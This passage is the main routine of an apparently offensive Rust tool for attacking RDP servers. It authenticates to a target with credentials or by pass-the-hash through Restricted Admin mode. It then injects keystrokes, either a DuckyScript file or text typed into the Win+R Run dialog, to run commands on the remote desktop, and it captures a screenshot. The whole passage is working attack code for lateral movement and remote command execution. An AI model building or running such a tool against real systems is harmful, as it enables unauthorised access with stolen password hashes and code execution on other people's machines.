            eprintln!("[!] {e}");
            process::exit(1);
        }
    };

    if let Err(e) = bridge.set_server(&args.server) {
        eprintln!("[!] Failed to set server: {e}");
        process::exit(1);
    }

    if let Err(e) = bridge.set_credentials(&args.username, &args.password, &args.domain) {
        eprintln!("[!] Failed to set credentials: {e}");
        process::exit(1);
    }

    if args.pth {
        println!("[*] Using pass-the-hash authentication (Restricted Admin mode)");
        if unsafe { rdp_bridge_enable_pth(bridge.ptr) } != 0 {
            eprintln!("[!] Failed to enable pass-the-hash: {}", bridge.last_error());
            process::exit(1);
        }
    }

    println!("[*] Connecting to {}...", args.server);
    if let Err(e) = bridge.connect() {
        eprintln!("[!] Connection failed: {e}");
        process::exit(1);
    }

    println!("[+] Connected and authenticated!");
    println!("[+] Session is active: {}", bridge.is_active());

    if !bridge.is_active() {
        eprintln!("[!] Session is not active, cannot send input");
        process::exit(1);
    }

    // Optional wait before actions
    if args.wait_seconds > 0 {
        println!("[*] Waiting {} seconds for desktop to fully load...", args.wait_seconds);
        unsafe { rdp_bridge_pump_events(bridge.ptr, (args.wait_seconds * 1000) as i32); }
    }

    // Execute actions
    if let Some(script_path) = args.duckyscript {
        println!("[*] Executing DuckyScript from '{}'...", script_path);
        match bridge.exec_ducky_file(&script_path) {
            Ok(_) => println!("[+] DuckyScript executed successfully."),
            Err(e) => {
                eprintln!("[!] DuckyScript execution failed: {e}");
                process::exit(1);
            }
        }
    } else if let Some(text) = args.winr {
        println!("[*] Opening Run dialog (Win+R) and typing...");
        match bridge.winr_and_type(&text) {
            Ok(_) => println!("[+] Win+R and typing completed."),
            Err(e) => {
                eprintln!("[!] Win+R failed: {e}");
                process::exit(1);
            }
        }
    } else {
        // Default: send Win+R (legacy behavior)
        println!("[*] Sending Win+R to open Run dialog...");
        let ret = unsafe { rdp_bridge_send_win_r(bridge.ptr) };
        if ret != 0 {
            eprintln!("[!] Failed to send Win+R: {}", bridge.last_error());
            process::exit(1);
        }
        println!("[+] Win+R sent successfully.");
    }

    // Screenshot after all actions
    if let Some(ref path) = args.screenshot {
        // Optional delay before screenshot to let the remote desktop finish rendering
        if args.screenshot_delay > 0 {
            println!("[*] Waiting {} seconds before taking screenshot...", args.screenshot_delay);
            unsafe { rdp_bridge_pump_events(bridge.ptr, (args.screenshot_delay * 1000) as i32); }
        }
        println!("[*] Taking screenshot to '{}'...", path);
        let c_path = std::ffi::CString::new(path.as_str())
            .map_err(|e| format!("Invalid screenshot path: {e}")).unwrap();
        let ret = unsafe { rdp_bridge_take_screenshot(bridge.ptr, c_path.as_ptr()) };
        if ret != 0 {
            eprintln!("[!] Screenshot failed: {}", bridge.last_error());
        }
    }

    println!("[*] Disconnecting...");
    if let Err(e) = bridge.disconnect() {
        eprintln!("[!] Disconnect warning: {e}");
    }

    println!("[+] Done.");
}
